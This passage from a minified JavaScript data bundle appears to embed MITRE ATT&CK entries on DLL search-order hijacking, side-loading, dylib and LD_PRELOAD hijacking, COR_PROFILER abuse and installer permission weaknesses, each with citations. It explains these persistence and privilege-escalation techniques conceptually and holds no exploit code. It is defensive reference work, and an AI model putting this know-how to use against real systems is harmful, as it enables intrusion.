p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002Fwalmartglobaltech\u002Fvba-stomping-advanced-maldoc-techniques-612c484ab278'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2020\u002F01\u002Fstomp-2-dis-brilliance-in-the-visual-basics.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fbontchev\u002Fpcodedmp'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";uV.external_references=[{source_name:b,external_id:uW,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1564\u002F007"},{source_name:"FireEye VBA stomp Feb 2020",url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2020\u002F01\u002Fstomp-2-dis-brilliance-in-the-visual-basics.html",description:"Cole, R., Moore, A., Stark, G., Stancill, B. (2020, February 5). STOMP 2 DIS: Brilliance in the (Visual) Basics. Retrieved September 17, 2020."},{source_name:"Evil Clippy May 2019",url:"https:\u002F\u002Foutflank.nl\u002Fblog\u002F2019\u002F05\u002F05\u002Fevil-clippy-ms-office-maldoc-assistant\u002F",description:"Hegt, S. (2019, May 5). Evil Clippy: MS Office maldoc assistant. Retrieved September 17, 2020."},{source_name:"Microsoft _VBA_PROJECT Stream",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fopenspecs\u002Foffice_file_formats\u002Fms-ovba\u002Fef7087ac-3974-4452-aab2-7dba2214d239",description:"Microsoft. (2020, February 19). 2.3.4.1 _VBA_PROJECT Stream: Version Dependent Project Information. Retrieved September 18, 2020."},{source_name:"Walmart Roberts Oct 2018",url:"https:\u002F\u002Fmedium.com\u002Fwalmartglobaltech\u002Fvba-stomping-advanced-maldoc-techniques-612c484ab278",description:"Sayre, K., Ogden, H., Roberts, C. (2018, October 10). VBA Stomping — Advanced Maldoc Techniques. Retrieved September 17, 2020."},{source_name:"pcodedmp Bontchev",url:"https:\u002F\u002Fgithub.com\u002Fbontchev\u002Fpcodedmp",description:"Bontchev, V. (2019, July 30). pcodedmp.py - A VBA p-code disassembler. Retrieved September 17, 2020."},{source_name:"oletools toolkit",url:"https:\u002F\u002Fgithub.com\u002Fdecalage2\u002Foletools",description:"decalage2. (2019, December 3). python-oletools. Retrieved September 18, 2020."}];uV["subtechnique-of"]=U;u_.id=u$;u_["object-type"]=a;u_.name="COR_PROFILER";u_.description="Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fdotnet\u002Fframework\u002Funmanaged-api\u002Fprofiling\u002Fprofiling-overview'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fdotnet\u002Fnetframework-4.0\u002Fee471451(v=vs.100)'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F001'\u003EComponent Object Model\u003C\u002Fa\u003E (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fdotnet\u002Fnetframework-4.0\u002Fee471451(v=vs.100)'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1548\u002F002'\u003EBypass User Account Control\u003C\u002Fa\u003E) if the victim .NET process executes at a higher permission level, as well as to hook and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562'\u003EImpair Defenses\u003C\u002Fa\u003E provided by .NET processes.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fredcanary.com\u002Fblog\u002Fblue-mockingbird-cryptominer\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fredcanary.com\u002Fblog\u002Fcor_profiler-for-persistence\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Foffsec.almond.consulting\u002FUAC-bypass-dotnet.html'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FOmerYa\u002FInvisi-Shell'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fweb.archive.org\u002Fweb\u002F20170720041203\u002Fhttp:\u002F\u002Fsubt0x10.blogspot.com\u002F2017\u002F05\u002Fsubvert-clr-process-listing-with-net.html'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";u_.external_references=[{source_name:b,external_id:u$,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F012"},{source_name:"Microsoft Profiling Mar 2017",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fdotnet\u002Fframework\u002Funmanaged-api\u002Fprofiling\u002Fprofiling-overview",description:"Microsoft. (2017, March 30). Profiling Overview. Retrieved June 24, 2020."},{source_name:"Microsoft COR_PROFILER Feb 2013",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fdotnet\u002Fnetframework-4.0\u002Fee471451(v=vs.100)",description:"Microsoft. (2013, February 4). Registry-Free Profiler Startup and Attach. Retrieved June 24, 2020."},{source_name:"RedCanary Mockingbird May 2020",url:"https:\u002F\u002Fredcanary.com\u002Fblog\u002Fblue-mockingbird-cryptominer\u002F",description:"Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020."},{source_name:"Red Canary COR_PROFILER May 2020",url:"https:\u002F\u002Fredcanary.com\u002Fblog\u002Fcor_profiler-for-persistence\u002F",description:"Brown, J. (2020, May 7). Detecting COR_PROFILER manipulation for persistence. Retrieved June 24, 2020."},{source_name:"Almond COR_PROFILER Apr 2019",url:"https:\u002F\u002Foffsec.almond.consulting\u002FUAC-bypass-dotnet.html",description:"Almond. (2019, April 30). UAC bypass via elevated .NET applications. Retrieved June 24, 2020."},{source_name:"GitHub OmerYa Invisi-Shell",url:"https:\u002F\u002Fgithub.com\u002FOmerYa\u002FInvisi-Shell",description:"Yair, O. (2019, August 19). Invisi-Shell. Retrieved June 24, 2020."},{source_name:"subTee .NET Profilers May 2017",url:"https:\u002F\u002Fweb.archive.org\u002Fweb\u002F20170720041203\u002Fhttp:\u002F\u002Fsubt0x10.blogspot.com\u002F2017\u002F05\u002Fsubvert-clr-process-listing-with-net.html",description:"Smith, C. (2017, May 18). Subvert CLR Process Listing With .NET Profilers. Retrieved June 24, 2020."}];u_["subtechnique-of"]=F;va.id=vb;va["object-type"]=a;va.name="DLL Search Order Hijacking";va.description="Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fdlls\u002Fdynamic-link-library-search-order?redirectedfrom=MSDN'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2010\u002F07\u002Fmalware-persistence-windows-registry.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and\u002For evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.owasp.org\u002Findex.php\u002FBinary_planting'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2011\u002F06\u002Ffxsst.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fsecurity-updates\u002Fsecurityadvisories\u002F2010\u002F2269637'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fdlls\u002Fdynamic-link-library-redirection?redirectedfrom=MSDN'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-US\u002Flibrary\u002Faa375365'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2010\u002F08\u002Fdll-search-order-hijacking-revisited.html'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.";va.external_references=[{source_name:b,external_id:vb,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F001"},{external_id:vc,source_name:c,url:vd},{source_name:"Microsoft Dynamic Link Library Search Order",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fdlls\u002Fdynamic-link-library-search-order?redirectedfrom=MSDN",description:"Microsoft. (2018, May 31). Dynamic-Link Library Search Order. Retrieved November 30, 2014."},{source_name:"FireEye Hijacking July 2010",url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2010\u002F07\u002Fmalware-persistence-windows-registry.html",description:"Harbour, N. (2010, July 15). Malware Persistence without the Windows Registry. Retrieved November 17, 2020."},{source_name:"OWASP Binary Planting",description:"OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.",url:"https:\u002F\u002Fwww.owasp.org\u002Findex.php\u002FBinary_planting"},{source_name:"FireEye fxsst June 2011",url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2011\u002F06\u002Ffxsst.html",description:"Harbour, N. (2011, June 3). What the fxsst?. Retrieved November 17, 2020."},{source_name:"Microsoft Security Advisory 2269637",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fsecurity-updates\u002Fsecurityadvisories\u002F2010\u002F2269637",description:"Microsoft. (, May 23). Microsoft Security Advisory 2269637. Retrieved March 13, 2020."},{source_name:"Microsoft Dynamic-Link Library Redirection",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fdlls\u002Fdynamic-link-library-redirection?redirectedfrom=MSDN",description:"Microsoft. (2018, May 31). Dynamic-Link Library Redirection. Retrieved March 13, 2020."},{source_name:"Microsoft Manifests",description:"Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.",url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-US\u002Flibrary\u002Faa375365"},{source_name:"FireEye DLL Search Order Hijacking",url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2010\u002F08\u002Fdll-search-order-hijacking-revisited.html",description:"Nick Harbour. (2010, September 1). DLL Search Order Hijacking Revisited. Retrieved March 13, 2020."}];va["subtechnique-of"]=F;ve.id=vf;ve["object-type"]=a;ve.name="DLL Side-Loading";ve.description="Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F001'\u003EDLL Search Order Hijacking\u003C\u002Fa\u003E, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and\u002For execution. Adversary payloads may also be encrypted\u002Fpacked or otherwise obfuscated until loaded into the memory of the trusted process.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fglobal\u002Fen\u002Fcurrent-threats\u002Fpdfs\u002Frpt-dll-sideloading.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";ve.external_references=[{source_name:b,external_id:vf,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F002"},{external_id:"CAPEC-641",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F641.html"},{source_name:"FireEye DLL Side-Loading",url:"https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fglobal\u002Fen\u002Fcurrent-threats\u002Fpdfs\u002Frpt-dll-sideloading.pdf",description:"Amanda Steward. (2014). FireEye DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry. Retrieved March 13, 2020."}];ve["subtechnique-of"]=F;vg.id=vh;vg["object-type"]=a;vg.name="Dylib Hijacking";vg.description="Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with \u003Ccode\u003E@rpath\u003C\u002Fcode\u003E, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the \u003Ccode\u003ELC_LOAD_WEAK_DYLIB\u003C\u002Fcode\u003E function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fobjective-see.com\u002Fblog\u002Fblog_0x46.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fmagazine\u002F2015\u002Fvb201503-dylib-hijacking.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FEmpireProject\u002FEmpire\u002Fblob\u002Fmaster\u002Flib\u002Fmodules\u002Fpython\u002Fsituational_awareness\u002Fhost\u002Fosx\u002FHijackScanner.py'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FEmpireProject\u002FEmpire\u002Fblob\u002F08cbd274bef78243d7a8ed6443b8364acd1fc48b\u002Flib\u002Fmodules\u002Fpython\u002Fpersistence\u002Fosx\u002FCreateHijacker.py'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.blackhat.com\u002Fdocs\u002Fus-15\u002Fmaterials\u002Fus-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftaomm.org\u002Fvol1\u002Fpdfs.html'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmalwareunicorn.org\u002Fworkshops\u002Fmacos_dylib_injection.html#5'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";vg.external_references=[{source_name:b,external_id:vh,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F004"},{external_id:vc,source_name:c,url:vd},{source_name:"Wardle Dylib Hijack Vulnerable Apps",url:"https:\u002F\u002Fobjective-see.com\u002Fblog\u002Fblog_0x46.html",description:"Patrick Wardle. (2019, July 2). Getting Root with Benign AppStore Apps. Retrieved March 31, 2021."},{source_name:"Wardle Dylib Hijacking OSX 2015",url:"https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fmagazine\u002F2015\u002Fvb201503-dylib-hijacking.pdf",description:"Patrick Wardle. (2015, March 1). Dylib Hijacking on OS X. Retrieved March 29, 2021."},{source_name:"Github EmpireProject HijackScanner",url:"https:\u002F\u002Fgithub.com\u002FEmpireProject\u002FEmpire\u002Fblob\u002Fmaster\u002Flib\u002Fmodules\u002Fpython\u002Fsituational_awareness\u002Fhost\u002Fosx\u002FHijackScanner.py",description:"Wardle, P., Ross, C. (2017, September 21). Empire Project Dylib Hijack Vulnerability Scanner. Retrieved April 1, 2021."},{source_name:"Github EmpireProject CreateHijacker Dylib",url:"https:\u002F\u002Fgithub.com\u002FEmpireProject\u002FEmpire\u002Fblob\u002F08cbd274bef78243d7a8ed6443b8364acd1fc48b\u002Flib\u002Fmodules\u002Fpython\u002Fpersistence\u002Fosx\u002FCreateHijacker.py",description:"Wardle, P., Ross, C. (2018, April 8). EmpireProject Create Dylib Hijacker. Retrieved April 1, 2021."},{url:rT,description:rU,source_name:rV},{source_name:"wardle artofmalware volume1",url:"https:\u002F\u002Ftaomm.org\u002Fvol1\u002Fpdfs.html",description:"Patrick Wardle. (2020, August 5). The Art of Mac Malware Volume 0x1: Analysis. Retrieved March 19, 2021."},{source_name:"MalwareUnicorn macOS Dylib Injection MachO",url:"https:\u002F\u002Fmalwareunicorn.org\u002Fworkshops\u002Fmacos_dylib_injection.html#5",description:"Amanda Rousseau. (2020, April 4). MacOS Dylib Injection Workshop. Retrieved March 29, 2021."},{source_name:"Apple Developer Doco Archive Run-Path",url:"https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Farchive\u002Fdocumentation\u002FDeveloperTools\u002FConceptual\u002FDynamicLibraries\u002F100-Articles\u002FRunpathDependentLibraries.html",description:"Apple Inc.. (2012, July 7). Run-Path Dependent Libraries. Retrieved March 31, 2021."}];vg["subtechnique-of"]=F;vi.id=vj;vi["object-type"]=a;vi.name="Dynamic Linker Hijacking";vi.description="Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as \u003Ccode\u003ELD_PRELOAD\u003C\u002Fcode\u003E on Linux or \u003Ccode\u003EDYLD_INSERT_LIBRARIES\u003C\u002Fcode\u003E on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.man7.org\u002Flinux\u002Fman-pages\u002Fman8\u002Fld.so.8.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.tldp.org\u002FHOWTO\u002FProgram-Library-HOWTO\u002Fshared-libraries.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Farchive\u002Fdocumentation\u002FDeveloperTools\u002FConceptual\u002FDynamicLibraries\u002F100-Articles\u002FOverviewOfDynamicLibraries.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.baeldung.com\u002Flinux\u002Fld_preload-trick-what-is'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system\u002Fnetwork resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the \u003Ccode\u003Eexport\u003C\u002Fcode\u003E command, \u003Ccode\u003Esetenv\u003C\u002Fcode\u003E function, or \u003Ccode\u003Eputenv\u003C\u002Fcode\u003E function. Adversaries can also leverage \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F006'\u003EDynamic Linker Hijacking\u003C\u002Fa\u003E to export variables in a shell or set variables programmatically using higher level syntax such Python’s \u003Ccode\u003Eos.environ\u003C\u002Fcode\u003E.\n\nOn Linux, adversaries may set \u003Ccode\u003ELD_PRELOAD\u003C\u002Fcode\u003E to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. \u003Ccode\u003ELD_PRELOAD\u003C\u002Fcode\u003E can be set via the environment variable or \u003Ccode\u003E\u002Fetc\u002Fld.so.preload\u003C\u002Fcode\u003E file.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.man7.org\u002Flinux\u002Fman-pages\u002Fman8\u002Fld.so.8.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.tldp.org\u002FHOWTO\u002FProgram-Library-HOWTO\u002Fshared-libraries.html'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Libraries specified by \u003Ccode\u003ELD_PRELOAD\u003C\u002Fcode\u003E are loaded and mapped into memory by \u003Ccode\u003Edlopen()\u003C\u002Fcode\u003E and \u003Ccode\u003Emmap()\u003C\u002Fcode\u003E respectively.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.datawire.io\u002Fcode-injection-on-linux-and-macos\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fhick.org\u002Fcode\u002Fskape\u002Fpapers\u002Fneedle.txt'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fphrack.org\u002Fissues\u002F51\u002F8.html'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.nth-dimension.org.uk\u002Fpub\u002FBTL.pdf'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the \u003Ccode\u003EDYLD_INSERT_LIBRARIES\u003C\u002Fcode\u003E environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftheevilbit.github.io\u002Fposts\u002Fdyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive\u002F'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.timac.org\u002F2012\u002F1218-simple-code-injection-using-dyld_insert_libraries\u002F'\u003E[12]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fjon-gabilondo-angulo-7635.medium.com\u002Fhow-to-inject-code-into-mach-o-apps-part-ii-ddb13ebc8191'\u003E[13]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ";vi.external_references=[{source_name:b,external_id:vj,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F006"},{external_id:fI,source_name:c,url:fJ},{external_id:vk,source_name:c,url:vl},{source_name:"Man LD.SO",url:"https:\u002F\u002Fwww.man7.org\u002Flinux\u002Fman-pages\u002Fman8\u002Fld.so.8.html",description:"Kerrisk, M. (2020, June 13). Linux Programmer's Manual. Retrieved June 15, 2020."},{source_name:"TLDP Shared Libraries",url:"https:\u002F\u002Fwww.tldp.org\u002FHOWTO\u002FProgram-Library-HOWTO\u002Fshared-libraries.html",description:"The Linux Documentation Project. (n.d.). Shared Libraries. Retrieved January 31, 2020."},{source_name:"Apple Doco Archive Dynamic Libraries",url:"https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Farchive\u002Fdocumentation\u002FDeveloperTools\u002FConceptual\u002FDynamicLibraries\u002F100-Articles\u002FOverviewOfDynamicLibraries.html",description:"Apple Inc.. (2012, July 23). Overview of Dynamic Libraries. Retrieved March 24, 2021."},{source_name:"Baeldung LD_PRELOAD",url:"https:\u002F\u002Fwww.baeldung.com\u002Flinux\u002Fld_preload-trick-what-is",description:"baeldung. (2020, August 9). What Is the LD_PRELOAD Trick?. Retrieved March 24, 2021."},{source_name:"Code Injection on Linux and macOS",url:"https:\u002F\u002Fwww.datawire.io\u002Fcode-injection-on-linux-and-macos\u002F",description:"Itamar Turner-Trauring. (2017, April 18). “This will only hurt for a moment”: code injection on Linux and macOS with LD_PRELOAD. Retrieved December 20, 2017."},{url:vm,description:vn,source_name:vo},{url:"http:\u002F\u002Fphrack.org\u002Fissues\u002F51\u002F8.html",description:"halflife. (1997, September 1). Shared Library Redirection Techniques. Retrieved December 20, 2017.",source_name:"Phrack halfdead 1997"},{source_name:"Brown Exploiting Linkers",url:"http:\u002F\u002Fwww.nth-dimension.org.uk\u002Fpub\u002FBTL.pdf",description:"Tim Brown. (2011, June 29). Breaking the links: Exploiting the linker. Retrieved March 29, 2021."},{source_name:"TheEvilBit DYLD_INSERT_LIBRARIES",url:"https:\u002F\u002Ftheevilbit.github.io\u002Fposts\u002Fdyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive\u002F",description:"Fitzl, C. (2019, July 9). DYLD_INSERT_LIBRARIES DYLIB injection in macOS \u002F OSX. Retrieved March 26, 2020."},{source_name:"Timac DYLD_INSERT_LIBRARIES",url:"https:\u002F\u002Fblog.timac.org\u002F2012\u002F1218-simple-code-injection-using-dyld_insert_libraries\u002F",description:"Timac. (2012, December 18). Simple code injection using DYLD_INSERT_LIBRARIES. Retrieved March 26, 2020."},{source_name:"Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass",url:"https:\u002F\u002Fjon-gabilondo-angulo-7635.medium.com\u002Fhow-to-inject-code-into-mach-o-apps-part-ii-ddb13ebc8191",description:"Jon Gabilondo. (2019, September 22). How to Inject Code into Mach-O Apps. Part II.. Retrieved March 24, 2021."}];vi["subtechnique-of"]=F;vp.id=vq;vp["object-type"]=a;vp.name="Executable Installer File Permissions Weakness";vp.description="Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the \u003Ccode\u003E%TEMP%\u003C\u002Fcode\u003E directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F001'\u003EDLL Search Order Hijacking\u003C\u002Fa\u003E.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1548\u002F002'\u003EBypass User Account Control\u003C\u002Fa\u003E. Several examples of this weakness in existing common installers have been reported to software vendors.\u003Csup\u003E\u003Ca 